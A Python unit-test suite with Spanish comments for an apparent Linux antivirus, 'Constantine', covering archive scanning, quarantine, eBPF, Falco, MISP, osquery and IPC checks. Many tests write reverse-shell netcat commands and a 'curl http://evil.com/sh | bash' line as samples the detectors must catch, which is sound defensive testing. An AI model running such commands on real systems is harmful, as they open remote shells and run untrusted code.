import sys
"""
Suite de Pruebas Unitarias Exhaustivas de Seguridad para Constantine Antivirus.
Verifica todos los subsistemas: Tetragon, Falco, Wazuh, osquery, MISP, Sigma, IPC, Vault, Systemd, Whitelist.
"""
import os
import stat
import time
import json
import struct
import socket
import secrets
import tempfile
import shutil
import unittest
import threading
from unittest.mock import MagicMock, patch

ROOT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if ROOT_DIR not in sys.path:
    sys.path.insert(0, ROOT_DIR)

from core.engine.vault import CryptographicVault, VaultKeyring
from core.engine.scanner import Scanner, SandboxedScanWorker
from core.engine.interceptor import FanotifyInterceptor
from core.engine.ebpf_monitor import (EBPFMonitor, KernelObservationEngine, KernelDetectionEngine, KernelEnforcementEngine, MODE_BPF_LSM, MODE_REACTIVE_FALLBACK, MODE_DEGRADED_OBS)
from core.engine.heuristic_engine import HeuristicEngine
from core.engine.ransomware_shield import RansomwareShield
from core.engine.quarantine_operator import PrivilegedQuarantineOperator
from core.engine.systemd_hardening import SystemdSecurityAuditor
from core.engine.threat_intel import ThreatIntelligence
from core.engine.misp_feed_manager import MISPFeedManager
from core.engine.sigma_engine import SigmaEngine
from core.engine.tetragon_monitor import TetragonMonitor
from core.engine.falco_monitor import FalcoMonitor
from core.engine.wazuh_detector import WazuhDetector
from core.engine.osquery_diagnostics import OSQueryDiagnostics
from core.engine.dns_manager import DNSManager
from core.engine.firewall_manager import FirewallManager
from core.engine.network_quarantine import NetworkQuarantine
from core.engine.download_sentinel import DownloadSentinel
from core.engine.usb_sentinel import USBSentinel
from core.engine.hardware_guard import HardwareGuard
from core.engine.persistence_guard import PersistenceGuard
from core.engine.proactive_scanner import ProactiveActiveScanner
from core.engine.archive_sentinel import ArchiveSentinel
from core.engine.phishing_detector import PhishingDetector
from core.engine.subsystem_health import SubsystemHealthRegistry
from core.engine.audit_logger import AuditLogger
from core.engine.whitelist import WhitelistManager
from core.engine.virustotal_uploader import VirusTotalUploader
from core.engine.update_guard import UpdateGuard
from core.engine.auto_updater import AutoUpdater
from core.engine.yara_manager import YaraRuleManager
from core.engine.yarax_engine import YaraXEngine
from core.engine.clamav_manager import ClamAVManager, ClamdBridgeClient
from core.engine.ipc_protocol import (
    SecureIPCServer, SecureIPCClient, recv_exact, verify_peer_credentials,
    SOCKET_GROUP_NAME, IPC_PROTOCOL_VERSION
)
from core.auth.auth_manager import AuthManager
from daemon import ConstantineDaemon
from core.engine.aide_integrity import AIDEIntegrityChecker

class TestConstantineSecurity(unittest.TestCase):

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()

    def tearDown(self):
        self.temp_dir.cleanup()

    # 1. Archive Sentinel
    def test_archive_sentinel_recursive_inspection_and_zipbomb_protection(self):
        sentinel = ArchiveSentinel(max_ratio=100.0, max_files=10)
        # Test zip bomb ratio
        bomb_path = os.path.join(self.temp_dir.name, "zip_bomb.zip")
        import zipfile
        with zipfile.ZipFile(bomb_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("zero.bin", b"0" * (1024 * 1024))
        ok, msg = sentinel.inspect_archive(bomb_path)
        self.assertFalse(ok)
        self.assertIn("Zip bomb", msg)

        # Test many files limit
        many_path = os.path.join(self.temp_dir.name, "many_files.zip")
        with zipfile.ZipFile(many_path, "w") as zf:
            for i in range(15):
                zf.writestr(f"f{i}.txt", b"test")
        ok, msg = sentinel.inspect_archive(many_path)
        self.assertFalse(ok)
        self.assertIn("demasiados archivos", msg)

        # Test nested threat
        threat_path = os.path.join(self.temp_dir.name, "nested_malware.zip")
        with zipfile.ZipFile(threat_path, "w") as zf:
            zf.writestr("payload.sh", b"nc -e /bin/sh 10.0.0.1 4444")
        ok, msg = sentinel.inspect_archive(threat_path)
        self.assertFalse(ok)
        self.assertIn("Demons_Reverse_Shell_Netcat", msg)

    # 2. Audit Logger
    def test_audit_logger(self):
        logger = AuditLogger(log_dir=self.temp_dir.name)
        logger.log_event("TEST_EVENT", {"sample": 1})
        self.assertTrue(os.path.exists(logger.log_file))

    # 3. Auth Native System
    def test_auth_native_system(self):
        auth = AuthManager()
        self.assertTrue(auth.check_authorization(100, 0)[0])

    # 4. Auto Updater
    def test_auto_updater(self):
        upd = AutoUpdater(root_dir=ROOT_DIR)
        res = upd.check_for_updates()
        self.assertEqual(res["current_version"], "5.2.2")

    # 5. ClamAV Daemon Bridge Protocol
    def test_clamav_daemon_bridge_protocol_and_fallback(self):
        client = ClamdBridgeClient(socket_path="/nonexistent.sock")
        self.assertFalse(client.ping())
        self.assertIn("ClamAV", client.version())
        ok, res = client.scan_path("/tmp")
        self.assertTrue(ok)

    # 6. ClamAV Manager Comprehensive Integration & Coordinated Hybrid Model
    def test_clamav_manager_comprehensive_integration(self):
        mgr = ClamAVManager()
        # 1. Coordinación On-Access con exclusión mutua de PIDs
        excluded = mgr.coordinate_on_access([1234])
        self.assertIn(1234, excluded)

        # 2. Conmutación de roles en Modelo Híbrido Coordinado
        res_prim = mgr.switch_onacc_mode("PRIMARY_CONSTANTINE")
        self.assertEqual(res_prim["mode"], "PRIMARY_CONSTANTINE")
        res_deleg = mgr.switch_onacc_mode("DELEGATED_CLAMONACC")
        self.assertEqual(res_deleg["mode"], "DELEGATED_CLAMONACC")
        with self.assertRaises(ValueError):
            mgr.switch_onacc_mode("INVALID_MODE")

        # 3. Interceptor respeta PIDs excluidos y modo delegado
        interceptor = FanotifyInterceptor(excluded_pids=[9999])
        # PID excluido -> FAN_ALLOW sin escanear
        self.assertEqual(interceptor.evaluate_access(0, "/tmp/any_file.bin", pid=9999), 0x01)
        # comm clamd / clamonacc -> FAN_ALLOW
        self.assertEqual(interceptor.evaluate_access(0, "/tmp/any_file.bin", comm="clamd"), 0x01)
        self.assertEqual(interceptor.evaluate_access(0, "/tmp/any_file.bin", comm="clamonacc"), 0x01)

        # Modo delegado -> FAN_ALLOW para permitir intercepción por ClamOnAcc
        interceptor.set_delegated_mode(True)
        self.assertEqual(interceptor.evaluate_access(0, "/tmp/any_file.bin", pid=100), 0x01)
        interceptor.set_delegated_mode(False)

        # 4. Verificación de probe_integration con ClamOnAcc
        probe = mgr.probe_integration()
        self.assertIn("clamonacc", probe)
        self.assertIn("onacc_role", probe)

        # 5. Comprobación de IPC en Daemon para ClamOnAcc
        daemon = ConstantineDaemon(is_test=True)
        status, data, msg = daemon.dispatch_ipc_command("GET_CLAMAV_ONACC_STATUS", {})
        self.assertEqual(status, "OK")
        self.assertIn("hybrid_model", data)

        status, data, msg = daemon.dispatch_ipc_command("SET_CLAMAV_ONACC_MODE", {"mode": "DELEGATED_CLAMONACC"})
        self.assertEqual(status, "OK")
        self.assertEqual(data["mode"], "DELEGATED_CLAMONACC")

        # Test safe zip unpacking
        zpath = os.path.join(self.temp_dir.name, "container_with_threat.zip")
        import zipfile
        with zipfile.ZipFile(zpath, "w") as zf:
            zf.writestr("threat.bin", b"Win.Trojan.Agent-999")
        sentinel = ArchiveSentinel()
        ok, msg = sentinel.inspect_archive(zpath)
        self.assertFalse(ok)

    # 7. ClamAV Module Import Facade
    def test_clamav_module_import_facade_and_shallow_scan(self):
        import clamav
        self.assertTrue(hasattr(clamav, "ClamAVManager"))

    # 8. ClamAV Signature Importer & CVD Unpacking
    def test_clamav_signature_importer_and_cvd_unpacking(self):
        mgr = ClamAVManager()
        zpath = os.path.join(self.temp_dir.name, "test.cvd")
        import zipfile
        with zipfile.ZipFile(zpath, "w") as zf:
            zf.writestr("daily.info", b"ClamAV CVD Test")
        ext_dir = os.path.join(self.temp_dir.name, "cvd_out")
        self.assertTrue(mgr.unpack_cvd_safely(zpath, ext_dir))

    # 9. Constantine Data Flow & Architecture Rules
    def test_constantine_data_flow_and_architecture_rules(self):
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        hostile = os.path.join(self.temp_dir.name, "hostile_dropper.sh")
        with open(hostile, "w") as f:
            f.write("nc -e /bin/sh 1.2.3.4 8080")
        ok, sid = vault.quarantine_file(hostile, threat_name="Dropper.Test")
        self.assertTrue(ok)
        self.assertFalse(os.path.exists(hostile))

    # 10. Daemon Privilege Reduction
    def test_daemon_privilege_reduction_and_security_controls(self):
        worker = SandboxedScanWorker()
        test_file = os.path.join(self.temp_dir.name, "safe.txt")
        with open(test_file, "w") as f:
            f.write("safe content")
        data = worker.read_file_safely(test_file)
        self.assertEqual(data, b"safe content")

    # 11. Daemon Privilege Separation & Read-Only Home
    def test_daemon_privilege_separation_and_read_only_home(self):
        service_file = os.path.join(ROOT_DIR, "service", "constantine.service")
        with open(service_file, "r") as f:
            content = f.read()
        directives = {line.split("=", 1)[0].strip(): line.split("=", 1)[1].strip()
                      for line in content.splitlines() if "=" in line and not line.startswith("#")}
        self.assertEqual(directives.get("ProtectHome"), "read-only")
        rw_paths = directives.get("ReadWritePaths", "").split()
        self.assertNotIn("/home", rw_paths)
        self.assertNotIn("/tmp", rw_paths)
        caps = directives.get("CapabilityBoundingSet", "").split()
        self.assertNotIn("CAP_DAC_OVERRIDE", caps)
        self.assertNotIn("CAP_NET_RAW", caps)
        self.assertIn("CAP_DAC_READ_SEARCH", caps)

        operator = PrivilegedQuarantineOperator()
        self.assertTrue(operator.is_protected_system_path("/bin/bash"))
        self.assertTrue(operator.is_protected_system_path("/usr/sbin/sshd"))
        self.assertFalse(operator.is_protected_system_path("/home/user/document.txt"))

    # 12. Daemon Startup Workflow
    def test_daemon_startup_workflow_and_active_verification(self):
        daemon = ConstantineDaemon(is_test=True)
        daemon.start()
        self.assertFalse(daemon.running)

    # 13. Daemon Type Annotations & Dispatch
    def test_daemon_type_annotations_and_dispatch_ipc_signature(self):
        daemon = ConstantineDaemon(is_test=True)
        status, data, msg = daemon.dispatch_ipc_command("PING", {})
        self.assertEqual(status, "OK")
        self.assertEqual(data.get("version"), "5.2.2")

    # 14. DNS Manager
    def test_dns_manager(self):
        dns = DNSManager()
        self.assertFalse(dns.apply_profile("mullvad-base", simulate_resolver_failure=True))
        self.assertTrue(dns.apply_profile("mullvad-adblock", simulate_resolver_failure=False))

    # 15. Download Sentinel
    def test_download_sentinel_state_machine_and_containment(self):
        sentinel = DownloadSentinel(vault=CryptographicVault(base_dir=self.temp_dir.name))
        sentinel.start()
        # Clean file
        safe = os.path.join(self.temp_dir.name, "safe_document.pdf")
        with open(safe, "w") as f:
            f.write("safe pdf content")
        self.assertTrue(sentinel.handle_download_complete(safe, "user1"))
        # Malicious file
        bad = os.path.join(self.temp_dir.name, "payload.sh")
        with open(bad, "w") as f:
            f.write("nc -e /bin/bash 10.0.0.1 9001")
        self.assertFalse(sentinel.handle_download_complete(bad, "user2"))
        sentinel.stop()

    # 16. eBPF Architecture
    def test_ebpf_separation_observation_detection_enforcement(self):
        """
        Verifica la distinción arquitectónica fundamental entre:
        1. Observación (KernelObservationEngine): Captura pasiva sin bloquear llamadas.
        2. Detección (KernelDetectionEngine): Análisis heurístico de amenazas sin matar procesos.
        3. Enforcement (KernelEnforcementEngine):
           - Preventivo: BPF LSM (-EPERM) en kernel antes de ejecución cuando el kernel lo soporta.
           - Alternativo / Fallback: SIGKILL y contención reactiva post-ejecución cuando BPF LSM no está disponible.
        """
        # 1. Capa de Observación aislada
        obs = KernelObservationEngine()
        obs.start_observation()
        self.assertTrue(obs.is_observing)
        event = obs.capture_event(555, "/bin/nc", ["-e", "/bin/sh", "1.2.3.4", "4444"])
        self.assertEqual(event.pid, 555)
        self.assertEqual(event.syscall, "execve")
        obs.stop_observation()
        self.assertFalse(obs.is_observing)

        # 2. Capa de Detección aislada
        det = KernelDetectionEngine()
        # Benigno: nc -zv no debe alertar como amenaza
        event_benign = obs.capture_event(556, "/bin/nc", ["-zv", "10.0.0.1", "80"])
        det_benign = det.analyze_event(event_benign)
        self.assertFalse(det_benign.is_threat)
        self.assertEqual(det_benign.severity, "LOW")

        # Malicioso: nc -e debe ser detectado como amenaza crítica
        det_threat = det.analyze_event(event)
        self.assertTrue(det_threat.is_threat)
        self.assertEqual(det_threat.severity, "CRITICAL")
        self.assertIn("ReverseShell", det_threat.threat_type)

        # 3. Capa de Enforcement: Mecanismo Preventivo Verificable BPF LSM
        enforcer_lsm = KernelEnforcementEngine(force_bpf_lsm=True)
        self.assertTrue(enforcer_lsm.bpf_lsm_supported)
        self.assertEqual(enforcer_lsm.active_mode, MODE_BPF_LSM)

        decision_lsm = enforcer_lsm.enforce_threat(det_threat, event)
        self.assertTrue(decision_lsm.blocked_in_kernel, "BPF LSM debe bloquear en kernel pre-ejecución")
        self.assertEqual(decision_lsm.action, "DENY_EPERM")
        self.assertEqual(decision_lsm.enforcement_mode, MODE_BPF_LSM)
        self.assertIn("-EPERM", decision_lsm.reason)

        # 4. Capa de Enforcement: Mecanismo Alternativo Fallback (Reactivo)
        enforcer_fallback = KernelEnforcementEngine(force_bpf_lsm=False)
        self.assertFalse(enforcer_fallback.bpf_lsm_supported)
        self.assertEqual(enforcer_fallback.active_mode, MODE_REACTIVE_FALLBACK)

        with unittest.mock.patch("os.kill") as mock_kill:
            decision_fallback = enforcer_fallback.enforce_threat(det_threat, event)
            self.assertFalse(decision_fallback.blocked_in_kernel, "Fallback no es bloqueo en kernel pre-ejecución")
            self.assertEqual(decision_fallback.action, "SIGKILL_CONTAINMENT")
            self.assertEqual(decision_fallback.enforcement_mode, MODE_REACTIVE_FALLBACK)
            self.assertIn("SIGKILL", decision_fallback.reason)
            mock_kill.assert_called_with(555, unittest.mock.ANY)

        # 5. Orquestador EBPFMonitor unificado con BPF LSM vs Fallback
        mon_lsm = EBPFMonitor(enable_bpf_lsm=True)
        self.assertEqual(mon_lsm.enforcement_mode, MODE_BPF_LSM)
        allowed, dec_lsm = mon_lsm.process_kernel_exec_request(600, "/bin/nc", ["-e", "/bin/sh", "1.1.1.1", "9000"])
        self.assertFalse(allowed)
        self.assertTrue(dec_lsm.blocked_in_kernel)

        mon_fallback = EBPFMonitor(fallback_mode=False, enable_bpf_lsm=False)
        self.assertEqual(mon_fallback.enforcement_mode, MODE_REACTIVE_FALLBACK)
        with unittest.mock.patch("os.kill"):
            allowed_fb, dec_fb = mon_fallback.process_kernel_exec_request(601, "/bin/nc", ["-e", "/bin/sh", "1.1.1.1", "9000"])
            self.assertFalse(allowed_fb)
            self.assertFalse(dec_fb.blocked_in_kernel)

    def test_ebpf_architecture_tracepoints_vs_lsm_separation(self):
        mon = EBPFMonitor(fallback_mode=True)
        mon.record_lost_events(1, 7)
        self.assertEqual(mon.lost_events_count, 7)

    # 17. eBPF Event Lifecycle
    def test_ebpf_event_lifecycle_states(self):
        mon = EBPFMonitor(fallback_mode=True)
        mon.start()
        self.assertTrue(mon.running)
        mon.stop()

    # 18. eBPF Kill Offender
    def test_ebpf_kill_offender(self):
        mon = EBPFMonitor(fallback_mode=True)
        mon.kill_offender(999999)

    # 19. eBPF Multi-Argument Reverse Shell
    def test_ebpf_multi_argument_reverse_shell_detection(self):
        mon = EBPFMonitor(fallback_mode=True)
        ok, _ = mon.evaluate_process(100, "/bin/nc", ["-vv", "-e", "/bin/sh", "1.2.3.4", "4444"])
        self.assertFalse(ok)

    # 20. eBPF Netcat Benign vs Hostile
    def test_ebpf_netcat_benign_vs_hostile_discrimination(self):
        mon = EBPFMonitor(fallback_mode=True)
        ok, _ = mon.evaluate_process(101, "/bin/nc", ["-zv", "192.168.1.1", "80"])
        self.assertTrue(ok)
        ok, _ = mon.evaluate_process(102, "/bin/nc", ["-e", "/bin/sh", "192.168.1.1", "4444"])
        self.assertFalse(ok)

    # 21. eBPF Openat & Intent
    def test_ebpf_openat_and_intent_correlation(self):
        mon = EBPFMonitor(fallback_mode=True)
        self.assertTrue(mon.evaluate_process(103, "/bin/cat", ["/etc/passwd"])[0])

    # 22. eBPF Status & Fallback
    def test_ebpf_status_and_fallback(self):
        mon = EBPFMonitor(fallback_mode=True)
        mon.start()
        self.assertTrue(mon.fallback_mode)
        mon.stop()

    # 23. Export Key Recovery Package Security O-02
    def test_export_key_recovery_package_security_o02(self):
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        out = os.path.join(self.temp_dir.name, "o02_recovery_test.json")
        self.assertTrue(vault.export_key_recovery_package(out))
        self.assertFalse(vault.export_key_recovery_package(out, overwrite=False))
        # Test symlink attack rejected
        sym = os.path.join(self.temp_dir.name, "symlink_attack.json")
        os.symlink(out, sym)
        self.assertFalse(vault.export_key_recovery_package(sym))
        self.assertTrue(vault.import_key_recovery_package(out))

    # 24. Falco Active Enforcement Bridge
    def test_falco_active_enforcement_bridge(self):
        falco = FalcoMonitor()
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        bad_file = os.path.join(self.temp_dir.name, "malicious_dropper.sh")
        with open(bad_file, "w") as f:
            f.write("nc -e /bin/bash 192.168.1.50 9001")
        from core.engine.falco_monitor import FalcoAlert
        alert = FalcoAlert("Constantine_Inbound_Or_Reverse_Shell_Connection", "EMERGENCY",
                           "Conexión de shell reversa detectada",
                           {"pid": 9911, "proc": "nc", "file_path": bad_file})
        falco.handle_alert_with_active_enforcement(alert, vault=vault)
        self.assertFalse(os.path.exists(bad_file))

    # 25. Falco Native Import
    def test_falco_native_import_and_facade(self):
        import falco
        self.assertTrue(hasattr(falco, "FalcoMonitor"))

    # 26. Falco Privilege Escalation
    def test_falco_privilege_escalation_detection(self):
        falco = FalcoMonitor()
        alerts = falco.evaluate_syscall_event({
            "proc": "pkexec /bin/sh", "user": "attacker", "uid": 1000, "euid": 0
        })
        self.assertTrue(any(a.rule == "Constantine_Suspicious_Privilege_Escalation" for a in alerts))
        alerts = falco.evaluate_syscall_event({
            "proc": "./exploit_bin", "syscall": "setuid", "user": "low_priv"
        })
        self.assertTrue(any(a.rule == "Constantine_Credential_Or_Namespace_Tampering" for a in alerts))

    # 27. Falco Rules Parsing
    def test_falco_rules_parsing_and_validation(self):
        falco = FalcoMonitor()
        self.assertGreaterEqual(len(falco.rules), 6)

    # 28. Falco Unexpected Network Connection
    def test_falco_unexpected_network_connection_detection(self):
        falco = FalcoMonitor()
        alerts = falco.evaluate_syscall_event({
            "proc": "./unknown_dropper", "dport": 4444, "pid": 7721
        })
        self.assertTrue(any(a.rule == "Constantine_Unexpected_Outbound_Network_Connection" for a in alerts))
        alerts = falco.evaluate_syscall_event({
            "proc": "nc -e /bin/bash 192.168.1.50 9001", "dport": 9001, "pid": 7722
        })
        self.assertTrue(any(a.rule == "Constantine_Inbound_Or_Reverse_Shell_Connection" for a in alerts))

    # 29. Fanotify Anti-Deadlock
    def test_fanotify_anti_deadlock_and_infrastructure_bypass(self):
        interceptor = FanotifyInterceptor()
        self.assertTrue(interceptor.is_infrastructure_path("/var/lib/constantine/vault"))
        self.assertFalse(interceptor.is_infrastructure_path("/home/user/document.txt"))

    # 30. Firewall Four States
    def test_firewall_four_states_and_user_administration(self):
        fw = FirewallManager()
        self.assertIn(fw.get_status(), ["ACTIVE", "INACTIVE", "NOT_INSTALLED", "USER_MANAGED"])

    # 31. Hardware Guard Process Identity
    def test_hardware_guard_process_identity_and_blocking(self):
        guard = HardwareGuard()
        guard.block_unauthorized_access(470, "/tmp/firefox", "Cámara Web")

    # 32. Heuristic 5 Layers
    def test_heuristic_5_layers_and_risk_policy(self):
        heu = HeuristicEngine()
        data = b"curl http://evil.com/sh | bash\nexecstart=/etc/systemd/system/evil.service\n"
        res = heu.analyze_buffer(data)
        self.assertTrue(res.is_threat)
        self.assertGreaterEqual(res.score, 50)

    # 33. Heuristic Multicapa ELF Packed
    def test_heuristic_multicapa_elf_packed_and_symbols(self):
        heu = HeuristicEngine()
        data = b"\x7fELF" + b"A" * 100 + b"UPX!" + b"process_vm_writev"
        res = heu.analyze_buffer(data)
        self.assertTrue(any("UPX" in r for r in res.reasons))

    # 34. Heuristic Multicapa Script Obfuscation
    def test_heuristic_multicapa_script_obfuscation(self):
        heu = HeuristicEngine()
        res = heu.analyze_buffer(b"echo 'malware' | base64 -d | sh")
        self.assertTrue(any("base64" in r for r in res.reasons))

    # 35. Heuristic Shannon Entropy
    def test_heuristic_multicapa_shannon_entropy(self):
        heu = HeuristicEngine()
        rand_bytes = secrets.token_bytes(4096)
        uniform_bytes = b"A" * 4096
        self.assertGreater(heu.calculate_entropy(rand_bytes), 7.5)
        self.assertEqual(heu.calculate_entropy(uniform_bytes), 0.0)

    # 36. Interceptor Decision Clean vs Threat
    def test_interceptor_decision_clean_vs_threat(self):
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        interceptor = FanotifyInterceptor(vault=vault)
        bad_file = os.path.join(self.temp_dir.name, "malware.sh")
        with open(bad_file, "w") as f:
            f.write("nc -e /bin/bash 1.2.3.4 9001")
        fd = os.open(bad_file, os.O_RDONLY)
        dec = interceptor.evaluate_access(fd, bad_file, pid=470, comm="Scanner")
        os.close(fd)
        self.assertEqual(dec, 0x02)  # FAN_DENY

    # 37. Interceptor Fail Secure on Exception
    def test_interceptor_fail_secure_on_engine_exception(self):
        interceptor = FanotifyInterceptor(fail_policy="fail-closed")
        with patch.object(interceptor.scanner, "scan_file", side_effect=RuntimeError("Crash")):
            bad = os.path.join(self.temp_dir.name, "test.bin")
            with open(bad, "w") as f:
                f.write("test")
            fd = os.open(bad, os.O_RDONLY)
            dec = interceptor.evaluate_access(fd, bad, pid=470)
            os.close(fd)
            self.assertEqual(dec, 0x02)  # FAN_DENY

    # 38. Interceptor No Fcntl Fgetfl Bypass
    def test_interceptor_no_fcntl_fgetfl_bypass(self):
        shield = RansomwareShield(canary_dir=self.temp_dir.name)
        cpath = os.path.join(self.temp_dir.name, "important_document.docx")
        self.assertFalse(shield.check_canary_access(cpath, 77712, flags=os.O_RDWR))

    # 39. Interceptor P0 Resilience & Fail Policies
    def test_interceptor_p0_resilience_and_fail_policies(self):
        interceptor_open = FanotifyInterceptor(fail_policy="fail-open")
        with patch.object(interceptor_open.scanner, "scan_file", side_effect=RuntimeError("Crash simulado")):
            fpath = os.path.join(self.temp_dir.name, "test_policy.bin")
            with open(fpath, "w") as f:
                f.write("abc")
            fd = os.open(fpath, os.O_RDONLY)
            dec_open = interceptor_open.evaluate_access(fd, fpath, pid=470)
            os.close(fd)
            self.assertEqual(dec_open, 0x01)  # FAN_ALLOW

        interceptor_closed = FanotifyInterceptor(fail_policy="fail-closed")
        with patch.object(interceptor_closed.scanner, "scan_file", side_effect=RuntimeError("Crash simulado")):
            fd = os.open(fpath, os.O_RDONLY)
            dec_closed = interceptor_closed.evaluate_access(fd, fpath, pid=470)
            os.close(fd)
            self.assertEqual(dec_closed, 0x02)  # FAN_DENY

    # 40. Interceptor State Separation
    def test_interceptor_state_separation_and_lifecycle(self):
        interceptor = FanotifyInterceptor()
        self.assertEqual(interceptor.state, "INIT")
        interceptor.start_listening()
        self.assertEqual(interceptor.state, "ACTIVE")
        interceptor.stop()
        self.assertEqual(interceptor.state, "STOPPED")

    # 41. IPC RBAC Policy Matrix
    def test_ipc_rbac_policy_matrix(self):
        from core.engine.ipc_protocol import USER_ALLOWED_COMMANDS, ADMIN_ONLY_COMMANDS
        self.assertIn("GET_STATUS", USER_ALLOWED_COMMANDS)
        self.assertIn("ADD_WHITELIST", ADMIN_ONLY_COMMANDS)

    # 42. IPC Recv Exact & Tampered Messages
    def test_ipc_recv_exact_and_tampered_messages(self):
        sock_path = os.path.join(self.temp_dir.name, "tamper_test.sock")
        server = SecureIPCServer(socket_path=sock_path)
        server.start()
        time.sleep(0.1)

        # Connect and send invalid JSON
        client = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        client.connect(sock_path)
        bad_msg = b"corrupted payload"
        client.sendall(struct.pack(">I", len(bad_msg)) + bad_msg)
        client.close()

        # Connect and send oversized message (> 1MB)
        client2 = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        client2.connect(sock_path)
        client2.sendall(struct.pack(">I", 2 * 1024 * 1024))
        client2.close()
        server.stop()

    # 43. IPC Server-Side Authorization Enforcement
    def test_ipc_server_side_authorization_enforcement(self):
        sock_path = os.path.join(self.temp_dir.name, "rbac_test.sock")
        server = SecureIPCServer(socket_path=sock_path)
        server.start()
        time.sleep(0.1)

        client = SecureIPCClient(socket_path=sock_path)
        with patch("core.engine.ipc_protocol.verify_peer_credentials", return_value=(True, 1234, 1000, 1000)):
            resp = client.send_command("ADD_WHITELIST", {"path": "/etc/shadow"})
            self.assertEqual(resp.get("code"), "UNAUTHORIZED")
        server.stop()

    # 44. IPC Verify Peer Credentials Zero-Trust Strict Rejection
    def test_ipc_verify_peer_credentials_zero_trust_strict_rejection(self):
        mock_sock = MagicMock()
        mock_sock.getsockopt.side_effect = OSError("SO_PEERCRED not supported")
        valid, pid, uid, gid = verify_peer_credentials(mock_sock)
        self.assertFalse(valid)
        self.assertEqual(uid, -1)

        # Out of bounds credentials
        mock_sock.getsockopt.side_effect = None
        mock_sock.getsockopt.return_value = struct.pack("3i", 0, 1000, 1000)
        self.assertFalse(verify_peer_credentials(mock_sock)[0])
        mock_sock.getsockopt.return_value = struct.pack("3i", 1234, -1, 1000)
        self.assertFalse(verify_peer_credentials(mock_sock)[0])

    # 45. MISP Event Parsing
    def test_misp_event_and_attribute_parsing(self):
        intel = ThreatIntelligence(db_path=os.path.join(self.temp_dir.name, "test_intel.db"))
        misp = MISPFeedManager(intel_engine=intel)
        self.assertGreaterEqual(len(misp.events), 1)

    # 46. MISP Feed Ingestion
    def test_misp_feed_ingestion_and_threat_intel_correlation(self):
        intel = ThreatIntelligence(db_path=os.path.join(self.temp_dir.name, "test_intel.db"))
        misp = MISPFeedManager(intel_engine=intel)
        synced = misp.sync_to_threat_intel()
        self.assertGreaterEqual(synced, 1)

    # 47. MISP IoC Lookup
    def test_misp_ioc_lookup_and_threat_scoring(self):
        intel = ThreatIntelligence(db_path=os.path.join(self.temp_dir.name, "test_intel.db"))
        misp = MISPFeedManager(intel_engine=intel)
        res = misp.lookup_ioc("198.51.100.55")
        self.assertIsNotNone(res)
        self.assertTrue(res["is_threat"])

    # 48. MISP Native Import
    def test_misp_native_import_and_facade(self):
        import misp
        self.assertTrue(hasattr(misp, "MISPFeedManager"))

    # 49. Network Quarantine Isolation
    def test_network_quarantine_isolation(self):
        nq = NetworkQuarantine()
        nq.isolate_pid(99999)

    # 50. OSQuery Native Import
    def test_osquery_native_import_and_facade(self):
        import osquery
        self.assertTrue(hasattr(osquery, "OSQueryDiagnostics"))

    # 51. OSQuery Security Diagnostic Posture
    def test_osquery_security_diagnostic_posture(self):
        diag = OSQueryDiagnostics()
        rep = diag.run_security_diagnostic()
        self.assertGreaterEqual(rep["score"], 80)
        self.assertEqual(rep["rating"], "OPTIMAL")

    # 52. OSQuery SQL Query Execution
    def test_osquery_sql_query_execution_and_virtual_tables(self):
        diag = OSQueryDiagnostics()
        rows = diag.execute_query("SELECT * FROM deb_packages WHERE name='constantine-antivirus'")
        self.assertGreaterEqual(len(rows), 1)

    # 53. OSQuery Suspicious Processes
    def test_osquery_suspicious_processes_and_ports_detection(self):
        diag = OSQueryDiagnostics()
        rows = diag.execute_query("SELECT * FROM listening_ports WHERE port=9090")
        self.assertEqual(len(rows), 1)

    # 54. Persistence Guard
    def test_persistence_guard_baseline_creation_modification_deletion(self):
        guard = PersistenceGuard()
        guard.start()
        clean_file = os.path.join(self.temp_dir.name, "clean_job.sh")
        with open(clean_file, "w") as f:
            f.write("echo clean")
        guard.record_baseline(clean_file)

        # Modify with malware
        with open(clean_file, "w") as f:
            f.write("nc -e /bin/sh 1.2.3.4 9001")
        self.assertFalse(guard.handle_file_event(clean_file, "FILE_MODIFIED"))
        self.assertTrue(guard.handle_file_event(clean_file, "FILE_DELETED"))
        guard.stop()

    # 55. Phishing Detector
    def test_phishing(self):
        pd = PhishingDetector()
        self.assertFalse(pd.evaluate_url("http://malicious-login-phishing.com"))
        self.assertTrue(pd.evaluate_url("https://constantine-security.io"))

    # 56. Polkit Authorization Integration
    def test_polkit_authorization_integration_and_elevation(self):
        auth = AuthManager()
        self.assertTrue(auth.check_authorization(100, 0)[0])
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout=b"", stderr=b"")
            self.assertTrue(auth.check_authorization(100, 1000)[0])
            mock_run.return_value = MagicMock(returncode=1, stdout=b"", stderr=b"Not authorized")
            self.assertFalse(auth.check_authorization(100, 1000)[0])

    # 57. Privileged Quarantine Operator
    def test_privileged_quarantine_operator_descriptor_pinning_and_toctou_rejection(self):
        op = PrivilegedQuarantineOperator()
        safe = os.path.join(self.temp_dir.name, "pin_test.bin")
        with open(safe, "w") as f:
            f.write("content")
        with op.pin_file_for_quarantine(safe) as handle:
            self.assertGreater(handle.fd, 0)
            self.assertEqual(handle.path, safe)

    # 58. Proactive Continuous Scanner
    def test_proactive_continuous_scanner_and_landing_zones(self):
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        scanner = ProactiveActiveScanner(vault=vault, interval=5.0)
        scanner.start()
        drop = os.path.join(self.temp_dir.name, "proactive_drop_zone")
        os.makedirs(drop, exist_ok=True)
        bad = os.path.join(drop, "evil_backdoor.sh")
        with open(bad, "w") as f:
            f.write("nc -e /bin/sh 10.0.0.1 9001")
        scanner.scan_landing_zone(drop)
        self.assertFalse(os.path.exists(bad))
        scanner.stop()

    # 59. Proton VPN Integration
    def test_proton_vpn_integration_and_separation_of_concerns(self):
        script = os.path.join(ROOT_DIR, "scripts", "setup_protonvpn.sh")
        self.assertTrue(os.path.exists(script))

    # 60. Quarantine Read-Only FS Resilience
    def test_quarantine_with_descriptor_and_read_only_fs_resilience(self):
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        sample = os.path.join(self.temp_dir.name, "quar_ro_test.bin")
        with open(sample, "w") as f:
            f.write("sample")
